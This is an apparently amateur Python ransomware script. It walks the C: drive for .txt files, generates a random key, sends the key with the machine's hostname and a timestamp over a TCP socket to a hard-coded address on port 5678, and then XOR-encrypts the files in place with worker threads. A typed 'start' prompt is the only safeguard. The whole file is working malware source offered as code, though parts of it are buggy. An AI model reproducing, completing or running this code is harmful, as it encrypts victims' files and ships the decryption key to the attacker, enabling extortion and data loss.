import os
import random
import socket
from datetime import datetime
from threading import Thread
from queue import Queue
safeguard=input("add safeguard to run the code ")
if safeguard!="start":
    quit()

encryptions=(".txt")

#gets all files in the C directory

filepaths=[]
for root,dirs,files in os.walk('C:\\'):
    for file in files:
        filepath,fileext= os.path.splitext(root+'\\'+file)
        if fileext in encryptions:
            filepaths.append(root+'\\'+file)
time=datetime.now()
#creating an encryption key

key=''
encryptionlevel=128//8
charpool=''
for i in range(0x00,0xFF):
    charpool +=(chr(i))

for i in range (encryptionlevel):
    key+=random.choice(charpool)

hostname=os.getenv('COMPUTERNAME')
print(hostname)

#key handeling
ip_address='192.168.1.4'
port=5678
with socket.socket(socket.AF_INET,socket.SOCK_STREAM)as stream:
    stream.connect((ip_address,port))
    stream.send(f'{time}:{hostname} ---> {key}'.encode('utf-8'))

#Encrypting files
q=Queue()

def encrypt(key):
    while q.not_empty:
        file= q.get()
        index=0
        maxindex=encryptionlevel-1
        try:
            with open(file,'rb') as f:
                data=f.read()
            with open(file,'w') as f:
                for byte in data :
                    xor_data= byte ^ ord(key[index])
                    f.write(xor_data.to_bytes(1,'little'))
                    if index >= maxindex:
                        index=0
                    else:
                        index +=1
        except:
            print("failed to encrypt file")
        q.task_done()
        

for file in filepaths:
    q.put(file)
for i in range(8):
    thread=Thread(target=encrypt,args=(key,),daemon=True)
    thread.start()

q.join()